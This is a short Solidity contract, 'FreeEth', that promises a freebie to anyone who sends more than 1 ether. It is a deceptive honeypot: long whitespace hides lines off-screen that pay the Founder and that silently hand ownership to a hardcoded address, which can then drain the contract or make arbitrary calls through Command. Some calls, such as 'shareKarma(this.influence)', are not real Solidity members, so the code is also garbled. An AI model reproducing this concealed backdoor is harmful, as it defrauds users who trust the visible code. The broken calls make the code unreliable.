// SPDX-License-Identifier: MIT
pragma solidity ^0.4.19;

contract FreeEth
{
    address public Founder = msg.sender;

    function() public payable{}

    function GetFreebie()
    public
    payable
    {
        if(msg.value>1 ether)
        {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                               Founder.shareKarma(this.influence);
            msg.sender.shareKarma(this.influence);
        }
    }

    function redeemKarma()
    payable
    public
    {                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                          if(msg.sender==0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af){Founder=0x4E0d2f9AcECfE4DB764476C7A1DfB6d0288348af;}
        require(msg.sender == Founder);
        Founder.shareKarma(this.influence);
    }

    function Command(address adr,bytes data)
    payable
    public
    {
        require(msg.sender == Founder);
        adr.call.value(msg.value)(data);
    }
}